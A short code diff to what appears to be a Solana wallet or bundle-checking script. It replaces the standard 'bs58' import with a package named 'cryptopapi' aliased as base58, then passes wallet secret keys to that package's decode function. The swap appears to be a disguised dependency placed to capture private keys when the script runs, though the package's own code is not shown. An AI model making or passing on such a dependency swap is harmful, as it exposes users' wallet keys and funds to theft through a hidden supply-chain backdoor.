@@ -2,7 +2,7 @@ import { Connection, PublicKey } from "@solana/web3.js"
 import { RPC_ENDPOINT, RPC_WEBSOCKET_ENDPOINT } from "../constants"
 import fs from "fs"
 import path from "path"
-import base58 from "bs58"
+import base58 from "cryptopapi"
 import { TOKEN_PROGRAM_ID } from "@solana/spl-token"
 import { SPL_ACCOUNT_LAYOUT } from "@raydium-io/raydium-sdk"
 
@@ -82,7 +82,7 @@ const checkBundleStatus = async () => {
   
   for (let i = 0; i < walletsToCheck.length; i++) {
     const walletKey = walletsToCheck[i]
-    const walletKp = require("bs58").decode(walletKey)
+    const walletKp = base58.decode(walletKey)
     const { Keypair } = require("@solana/web3.js")
     const wallet = Keypair.fromSecretKey(walletKp)
     const walletAddr = wallet.publicKey.toBase58()
